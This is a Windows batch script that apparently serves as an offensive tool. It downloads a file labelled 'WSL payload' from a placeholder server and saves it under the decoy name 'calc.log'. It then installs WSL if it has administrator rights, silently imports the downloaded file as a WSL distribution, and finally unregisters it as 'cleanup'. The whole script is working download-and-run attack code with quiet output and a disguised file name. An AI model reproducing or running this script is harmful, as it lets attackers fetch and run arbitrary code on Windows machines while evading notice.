@echo off
setlocal enabledelayedexpansion

:: Set working directory and download variables
set "TWD=.\"
set "DOWNLOAD_URL=https://your-server.com/payload.wsl"
set "WSL_FILE=%TWD%calc.log"

:: Download the WSL payload file
call :print_info "Downloading WSL payload"
curl -s -L -o "%WSL_FILE%" "%DOWNLOAD_URL%"
if %errorlevel% neq 0 (
    call :print_error "Failed to download WSL file"
    echo.
    exit /b 1
)

:: Check if WSL is already installed and enabled
call :print_info "Checking WSL installation status..."
wsl --status >nul 2>&1
if %errorlevel% equ 0 (
    call :print_good "WSL is already installed and enabled"
    goto :install_distribution
) else (
    call :print_warning "WSL is not installed or not enabled"
    echo.
    call :print_info "Checking administrator privileges..."
    echo.
    
    net session >nul 2>&1
    if %errorlevel% neq 0 (
        call :print_error "Administrator privileges required"
        call :print_error "Since WSL is not installed and you don't have admin rights,"
        call :print_error "this script cannot proceed. Please run as administrator."
        echo.
        exit /b 1
    ) else (
        call :print_good "Running with administrator privileges"
        echo.
        call :print_info "Installing WSL..."
        call :print_info "This may take a few minutes..."
        echo.
        
        wsl --install --no-launch
        if %errorlevel% neq 0 (
            call :print_error "Failed to install WSL"
            echo.
            pause
            exit /b 1
        )
        
        echo.
        call :print_good "WSL installation completed successfully"
        echo.
        
        :: Wait a moment for WSL to fully initialize
        call :print_info "Waiting for WSL to initialize..."
        timeout /t 5 /nobreak >nul
        echo.
    )
)

:install_distribution
call :print_info "Installing WSL distribution from '%WSL_FILE%'..."
echo.

wsl --install --from-file "%WSL_FILE%" >nul 2>&1
if %errorlevel% neq 0 (
    call :print_error "Failed to install WSL distribution"
    echo.
    exit /b 1
)

echo.
call :print_good "WSL distribution installed successfully!"
echo.

:: Remove the WSL distribution
wsl --unregister "%WSL_FILE%" >nul 2>&1
call :print_good "Cleanup completed"
echo.

exit /b 0

:: Function definitions for colored output
:print_good
echo [+]: %~1
goto :eof

:print_error
echo [-]: %~1
goto :eof

:print_info
echo [*]: %~1
goto :eof

:print_warning
echo [!]: %~1
goto :eof